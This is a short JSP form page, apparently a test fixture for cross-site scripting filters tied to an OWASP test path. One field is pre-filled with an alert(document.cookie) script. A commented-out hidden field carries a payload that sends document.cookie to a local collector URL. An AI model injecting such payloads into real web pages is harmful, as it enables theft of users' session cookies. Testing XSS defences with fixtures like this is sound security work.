<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title>Insert title here</title>
	</head>
	<body>
		<form action="XSSTest" method="get" >
			<p>
				<%-- badUrl:<br />
				<input name="badUrl" size="120" type="hidden"
				value="<script>window.location='http://localhost:8080/owasp/bad?input=' + document.cookie</script>" /> --%> 
		</p>		
			<p>
				normal:<br />
				<input name="normal" size="60" type="text" value="commnText" />
			</p>
			<p>
				javascript: <br />
				<input name="javaScript" size="60" type="text"
					value="<script>alert(document.cookie)</script>" 
				/>				
			</p>	
			<input name="submit" type="submit" value="GO" />
		</form>
	</body>
</html>